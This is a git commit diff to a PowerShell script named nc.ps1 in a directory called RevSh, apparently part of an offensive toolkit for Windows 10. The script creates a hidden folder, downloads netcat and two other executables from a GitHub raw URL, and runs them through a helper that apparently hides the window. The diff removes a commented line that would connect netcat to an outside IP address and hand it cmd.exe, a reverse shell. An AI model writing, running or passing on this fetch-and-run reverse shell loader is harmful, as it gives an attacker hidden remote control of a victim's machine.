711068ce848f2c1e1488b7e772baa4b8244d544c
7ext 34 <55564552+7ext34@users.noreply.github.com>
2019-10-17 20:16:27 -0400

    Update nc.ps1

--- RevSh/Windows10/nc.ps1
+++ RevSh/Windows10/nc.ps1
@@ -5,7 +5,6 @@ cmd /c "attrib +h C:\nc"
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.exe","C:\nc\nc.exe")
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/rh.exe","C:\nc\rh.exe")
 (new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/voice.exe","C:\nc\voice.exe")
-#echo "nc.exe 64.52.163.41 8080 -e cmd.exe" >> C:\nc\nc_run.bat
 Start-Sleep -s 5
 cd C:\nc
 cmd.exe /c rh.exe nc.bat
